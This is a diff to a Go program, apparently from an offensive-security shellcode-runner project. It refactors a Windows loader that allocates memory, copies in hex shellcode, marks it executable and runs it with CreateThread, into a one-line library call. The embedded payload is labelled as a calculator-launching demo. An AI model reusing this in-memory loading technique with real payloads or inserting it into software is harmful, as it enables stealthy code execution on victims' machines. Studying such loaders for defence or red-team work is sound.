+++ cmd/CreateThread/main.go
@@ -10,99 +10,18 @@ This program executes shellcode in the current process using the following steps
 
 This program leverages the functions from golang.org/x/sys/windows to call Windows procedures instead of manually loading them
 */
-
 package main
 
 import (
-	"encoding/hex"
-	"flag"
-	"fmt"
 	"log"
-	"unsafe"
 
-	// Sub Repositories
-	"golang.org/x/sys/windows"
+	sc "github.com/cauefcr/go-shellcode"
 )
 
 func main() {
-	verbose := flag.Bool("verbose", false, "Enable verbose output")
-	debug := flag.Bool("debug", false, "Enable debug output")
-	flag.Parse()
-
-	// Pop Calc Shellcode
-	shellcode, errShellcode := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
-	if errShellcode != nil {
-		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
-	}
-
-	if *debug {
-		fmt.Println("[DEBUG]Calling VirtualAlloc for shellcode")
-	}
-	addr, errVirtualAlloc := windows.VirtualAlloc(uintptr(0), uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
-
-	if errVirtualAlloc != nil {
-		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
-	}
-
-	if addr == 0 {
-		log.Fatal("[!]VirtualAlloc failed and returned 0")
-	}
-
-	if *verbose {
-		fmt.Println(fmt.Sprintf("[-]Allocated %d bytes", len(shellcode)))
-	}
-
-	if *debug {
-		fmt.Println("[DEBUG]Copying shellcode to memory with RtlCopyMemory")
-	}
-	ntdll := windows.NewLazySystemDLL("ntdll.dll")
-	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
-	_, _, errRtlCopyMemory := RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
-
-	if errRtlCopyMemory != nil && errRtlCopyMemory.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("[!]Error calling RtlCopyMemory:\r\n%s", errRtlCopyMemory.Error()))
-	}
-
-	if *verbose {
-		fmt.Println("[-]Shellcode copied to memory")
-	}
-
-	if *debug {
-		fmt.Println("[DEBUG]Calling VirtualProtect to change memory region to PAGE_EXECUTE_READ")
-	}
-	var oldProtect uint32
-	errVirtualProtect := windows.VirtualProtect(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &oldProtect)
-	if errVirtualProtect != nil {
-		log.Fatal(fmt.Sprintf("[!]Error calling VirtualProtect:\r\n%s", errVirtualProtect.Error()))
-	}
-	if *verbose {
-		fmt.Println("[-]Shellcode memory region changed to PAGE_EXECUTE_READ")
-	}
-
-	if *debug {
-		fmt.Println("[DEBUG]Calling CreateThread...")
-	}
-	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
-	CreateThread := kernel32.NewProc("CreateThread")
-	thread, _, errCreateThread := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)
-
-	if errCreateThread != nil && errCreateThread.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("[!]Error calling CreateThread:\r\n%s", errCreateThread.Error()))
-	}
-	if *verbose {
-		fmt.Println("[+]Shellcode Executed")
-	}
-
-	if *debug {
-		fmt.Println("[DEBUG]Calling WaitForSingleObject...")
-	}
-
-	event, errWaitForSingleObject := windows.WaitForSingleObject(windows.Handle(thread), 0xFFFFFFFF)
-	if errWaitForSingleObject != nil {
-		log.Fatal(fmt.Sprintf("[!]Error calling WaitForSingleObject:\r\n:%s", errWaitForSingleObject.Error()))
-	}
-	if *verbose {
-		fmt.Println(fmt.Sprintf("[-]WaitForSingleObject returned with %d", event))
+	err := sc.RunSCcreateThread("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3", 2)
+	if err != nil {
+		log.Panic(err)
 	}
 }
